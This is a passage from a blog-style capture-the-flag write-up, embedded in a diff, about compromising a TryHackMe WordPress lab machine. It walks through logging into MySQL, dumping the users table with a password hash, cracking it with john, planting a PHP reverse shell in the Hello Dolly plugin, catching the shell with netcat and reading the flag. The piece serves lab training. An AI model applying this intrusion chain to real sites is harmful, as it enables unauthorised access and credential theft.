+<span class="hljs-comment">/**#@-*/</span>
+
+<span class="hljs-comment">/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */</span>
+$table_prefix = <span class="hljs-string">'wptry_'</span>;
+
+<span class="hljs-comment">/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'WP_DEBUG'</span>, <span class="hljs-literal">false</span> );
+
+<span class="hljs-comment">/* That's all, stop editing! Happy publishing. */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>(<span class="hljs-string">'WP_HOME'</span>, <span class="hljs-literal">false</span>);
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>(<span class="hljs-string">'WP_SITEURL'</span>, <span class="hljs-literal">false</span>);
+
+<span class="hljs-comment">/** Absolute path to the WordPress directory. */</span>
+<span class="hljs-keyword">if</span> ( ! defined( <span class="hljs-string">'ABSPATH'</span> ) ) {
+    <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'ABSPATH'</span>, __DIR__ . <span class="hljs-string">'/'</span> );
+}
+
+<span class="hljs-comment">/** Sets up WordPress vars and included files. */</span>
+require_once ABSPATH . <span class="hljs-string">'wp-settings.php'</span>;
+</code></pre><p><strong><em>Login to sqldatabase</em></strong></p>
+<p><code>mysql -h 10.10.101.117 -u [username] -p</code></p>
+<pre><code>MySQL [(none)]&gt; show databases ;
++--------------------+
+|<span class="hljs-string"> Database           </span>|
++--------------------+
+|<span class="hljs-string"> information_schema </span>|
+|<span class="hljs-string"> mysql              </span>|
+|<span class="hljs-string"> performance_schema </span>|
+|<span class="hljs-string"> sys                </span>|
+|<span class="hljs-string"> [Redacted]         </span>|
++--------------------+
+5 rows in set (0.169 sec)
+
+
+MySQL [(none)]&gt; use [Redacted] 
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [Redacted] &gt; show tables;
++--------------------------+
+|<span class="hljs-string"> Tables_in_wordpressdb2   </span>|
++--------------------------+
+|<span class="hljs-string"> wptry_commentmeta        </span>|
+|<span class="hljs-string"> wptry_comments           </span>|
+|<span class="hljs-string"> wptry_links              </span>|
+|<span class="hljs-string"> wptry_options            </span>|
+|<span class="hljs-string"> wptry_postmeta           </span>|
+|<span class="hljs-string"> wptry_posts              </span>|
+|<span class="hljs-string"> wptry_term_relationships </span>|
+|<span class="hljs-string"> wptry_term_taxonomy      </span>|
+|<span class="hljs-string"> wptry_termmeta           </span>|
+|<span class="hljs-string"> wptry_terms              </span>|
+|<span class="hljs-string"> wptry_usermeta           </span>|
+|<span class="hljs-string"> wptry_users              </span>|
++--------------------------+
+12 rows in set (0.168 sec)
+
+MySQL [wordpressdb2]&gt; SELECT <span class="hljs-symbol">*</span> FROM wptry_users;
++----+------------+------------------------------------+---------------+------------------------------+----------------------------------+---------------------+-----------------------------------------------+-------------+------------------+
+|<span class="hljs-string"> ID </span>|<span class="hljs-string"> user_login </span>|<span class="hljs-string"> user_pass                          </span>|<span class="hljs-string"> user_nicename </span>|<span class="hljs-string"> user_email                   </span>|<span class="hljs-string"> user_url                         </span>|<span class="hljs-string"> user_registered     </span>|<span class="hljs-string"> user_activation_key                           </span>|<span class="hljs-string"> user_status </span>|<span class="hljs-string"> display_name     </span>|
++----+------------+------------------------------------+---------------+------------------------------+----------------------------------+---------------------+-----------------------------------------------+-------------+------------------+
+|<span class="hljs-string">  1 </span>|<span class="hljs-string"> corp-001   </span>|<span class="hljs-string"> [Redacted] </span>|<span class="hljs-string"> corp-001      </span>|<span class="hljs-string"> corp-001@fakemail.com        </span>|<span class="hljs-string"> http://192.168.85.131/wordpress2 </span>|<span class="hljs-string"> 2021-05-26 23:35:28 </span>|<span class="hljs-string">                                               </span>|<span class="hljs-string">           0 </span>|<span class="hljs-string"> corp-001         </span>|
+|<span class="hljs-string">  2 </span>|<span class="hljs-string"> test-corp  </span>|<span class="hljs-string"> $P$Bk3Zzr8rb.5dimh99TRE1krX8X85eR0 </span>|<span class="hljs-string"> test-corp     </span>|<span class="hljs-string"> test-corp@tryhackme.fakemail </span>|<span class="hljs-string">                                  </span>|<span class="hljs-string"> 2021-05-26 23:47:32 </span>|<span class="hljs-string"> 1622072852:$P$BJWv.2ehT6U5Ndg/xmFlLobPl37Xno0 </span>|<span class="hljs-string">           0 </span>|<span class="hljs-string"> Corporation Test </span>|
++----+------------+------------------------------------+---------------+------------------------------+----------------------------------+---------------------+-----------------------------------------------+-------------+------------------+
+2 rows in set (0.172 sec)
+</code></pre><p><strong><em>Cracking password using john</em></strong></p>
+
+<pre><code>john passlist.txt 
+Using default <span class="hljs-built_in">input</span> encodin<span class="hljs-variable">g:</span> UTF-<span class="hljs-number">8</span>
+Loaded <span class="hljs-number">1</span> password hash (phpass [phpass ($<span class="hljs-keyword">P</span>$ <span class="hljs-built_in">or</span> $H$) <span class="hljs-number">256</span>/<span class="hljs-number">256</span> AVX2 <span class="hljs-number">8</span>x3])
+Cost <span class="hljs-number">1</span> (iteration <span class="hljs-built_in">count</span>) <span class="hljs-keyword">is</span> <span class="hljs-number">8192</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes
+Will run <span class="hljs-number">4</span> OpenMP threads
+Proceeding with single, rule<span class="hljs-variable">s:Single</span>
+Press <span class="hljs-string">'q'</span> <span class="hljs-built_in">or</span> Ctrl-C <span class="hljs-keyword">to</span> abort, almost any other key <span class="hljs-keyword">for</span> status
+Almost done: Processing the remaining buffered candidate passwords, <span class="hljs-keyword">if</span> any.
+Proceeding with wordlis<span class="hljs-variable">t:</span>/usr/share/john/password.lst, rule<span class="hljs-variable">s:Wordlist</span>
+[Redacted]        (?)
+<span class="hljs-number">1</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> DONE <span class="hljs-number">2</span>/<span class="hljs-number">3</span> (<span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">21</span> <span class="hljs-number">01</span>:<span class="hljs-number">51</span>) <span class="hljs-number">1.538</span>g/s <span class="hljs-number">1772</span><span class="hljs-keyword">p</span>/s <span class="hljs-number">1772</span><span class="hljs-keyword">c</span>/s <span class="hljs-number">1772</span>C/s bigdog..<span class="hljs-number">88888888</span>
+Use the <span class="hljs-string">"--show --format=phpass"</span> <span class="hljs-keyword">options</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">display</span> <span class="hljs-keyword">all</span> of the cracked passwords reliably
+Session completed
+</code></pre><p>
+
+
+
+
+
+<p><strong><em>login to wp-admin (administration account)</em></strong>
+
+        <!-- Post Image Start -->
+                                <div class="post-image margin-top-40 margin-bottom-40">
+                                   <img src="images/writeup/CVE-2021-29447/admin_accont.png" alt="">
+                                                                         
+                                  </div>
+                                  <!-- Post Image End -->
+
+
+
+
+
++Adding rev-shell from php  in the source code of hello dolly plugin
+</p>
+     <!-- Post Image Start -->
+                                <div class="post-image margin-top-40 margin-bottom-40">
+                                   <img src="images/writeup/CVE-2021-29447/hello_php.png" alt="">
+                                                                         
+                                  </div>
+                                  <!-- Post Image End -->
+
+<p>Acessing the Page</p>
+<p><code>10.10.101.117/wp-content/plugins/hello.php</code></p>
+<p><strong>Revshell and local flag</strong></p>
+
+<pre><code><span class="hljs-title">nc</span> -lvp <span class="hljs-number">1337</span>
+<span class="hljs-title">listening</span> on [any] <span class="hljs-number">1337</span> ...
+<span class="hljs-number">10.10</span><span class="hljs-number">.101</span><span class="hljs-number">.117</span>: inverse host lookup failed: <span class="hljs-type">Unknown</span> host
+<span class="hljs-title">connect</span> to [<span class="hljs-number">10.17</span><span class="hljs-number">.27</span><span class="hljs-number">.15</span>] from (<span class="hljs-type">UNKNOWN</span>) [<span class="hljs-number">10.10</span><span class="hljs-number">.101</span><span class="hljs-number">.117</span>] <span class="hljs-number">34628</span>
+<span class="hljs-type">Linux</span> ubuntu <span class="hljs-number">4.4</span><span class="hljs-number">.0</span><span class="hljs-number">-210</span>-generic #<span class="hljs-number">242</span>-<span class="hljs-type">Ubuntu</span> <span class="hljs-type">SMP</span> <span class="hljs-type">Fri</span> <span class="hljs-type">Apr</span> <span class="hljs-number">16</span> <span class="hljs-number">09</span>:<span class="hljs-number">57</span>:<span class="hljs-number">56</span> <span class="hljs-type">UTC</span> <span class="hljs-number">2021</span> x86_64 x86_64 x86_64 <span class="hljs-type">GNU</span>/<span class="hljs-type">Linux</span>
+ <span class="hljs-number">08</span>:<span class="hljs-number">15</span>:<span class="hljs-number">28</span> up  <span class="hljs-number">1</span>:<span class="hljs-number">34</span>,  <span class="hljs-number">0</span> users,  load average: <span class="hljs-number">0.01</span>, <span class="hljs-number">0.01</span>, <span class="hljs-number">0.00</span>
+<span class="hljs-type">USER</span>     <span class="hljs-type">TTY</span>      <span class="hljs-type">FROM</span>             <span class="hljs-type">LOGIN</span>@   <span class="hljs-type">IDLE</span>   <span class="hljs-type">JCPU</span>   <span class="hljs-type">PCPU</span> <span class="hljs-type">WHAT</span>
+<span class="hljs-title">uid</span>=<span class="hljs-number">33</span>(www-<span class="hljs-class"><span class="hljs-keyword">data</span>) gid=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>) groups=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>)</span>
+<span class="hljs-title">sh</span>: <span class="hljs-number">0</span>: can't access tty; job control turned off
+$ id
+<span class="hljs-title">uid</span>=<span class="hljs-number">33</span>(www-<span class="hljs-class"><span class="hljs-keyword">data</span>) gid=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>) groups=33(<span class="hljs-title">www</span>-<span class="hljs-title">data</span>)</span>
+</code></pre><p>
+
+
+<p><strong>Getting Flag</strong>
+<code>cat /home/stux/flag/flag.txt</code></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <!-- <div class="subscribe-form margin-top-20">
+               <input id="mc-email" type="email" placeholder="Email Address" class="text-input">
+                <button class="submit-btn" type="submit">Submit</button>
+                </div>
+                                <p>Subscribe to my weekly newsletter</p>
+                <label for="mc-email" class="mc-label"></label>
+                </form>
+                             
+                           </div> -->
+                           <!-- Subscribe Form End
+                           
+                         </div>
+                      -->
+                     
+                       <!-- Footer Start -->
+                       <div class="col-md-12 page-body margin-top-50 footer">
+                          <footer>
+                          <ul class="menu-link">
+                               <li><a href="index.html">Home</a></li>
+                               <li><a href="#">About</a></li>
+                               <<!-- li><a href="work.html">Work</a></li>
+                               <li><a href="contact.html">Contact</a> --></li>
+                            </ul>
+                            
+                          <p>© Copyright 2022 . All rights reserved</p>
+              
+              
+              <!--  Credit Start -->
+                          <div class="-credit">Design By <a href=#>sms</a></div>
+                          <!--  Credit End -->
+
+                           
+                         </footer>
+                       </div>
+                       <!-- Footer End -->
+                     
+                     
+                  </div>
+                  <!-- Blog Post (Right Sidebar) End -->
+                
+            </div>
+         </div>
+      </div>
+    
+    
+    
+    <!-- Back to Top Start -->
+    <a href="#" class="scroll-to-top"><i class="fa fa-long-arrow-up"></i></a>
+    <!-- Back to Top End -->
+    
+    
+    <!-- All Javascript Plugins  -->
+    <script type="text/javascript" src="js/jquery.min.js"></script>
+    <script type="text/javascript" src="js/plugin.js"></script>
+    
+    <!-- Main Javascript File  -->
+    <script type="text/javascript" src="js/scripts.js"></script>
+
+    
+   </body>
+ </html>
